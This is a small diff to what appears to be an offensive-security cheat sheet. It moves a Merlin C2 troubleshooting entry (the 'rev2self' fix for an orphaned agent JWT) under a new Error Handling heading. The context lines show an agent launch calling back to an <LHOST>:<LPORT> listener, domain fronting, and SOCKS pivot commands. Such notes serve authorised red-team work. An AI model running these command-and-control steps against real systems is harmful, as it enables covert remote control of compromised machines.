@@ -1163,12 +1163,6 @@ Merlin» interact 2711ef1d-0b53-490d-add9-7ae3c0878b07
 Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» info
 ```
 
-##### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.
-
-```console
-Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
-```
-
 #### Domain Fronting
 
 ```console
@@ -1187,6 +1181,14 @@ $ ./merlinAgent-Linux-x64 -url http://<LHOST>:<LPORT> -psk '<PSK>' -padding 0 -s
 Merlin» socks list
 Merlin» socks start <PORT> <AGENT>
 Merlin» socks stop <PORT> <AGENT>
+```
+
+### Error Handling
+
+#### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.
+
+```console
+Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
 ```
 
 ## Mythic
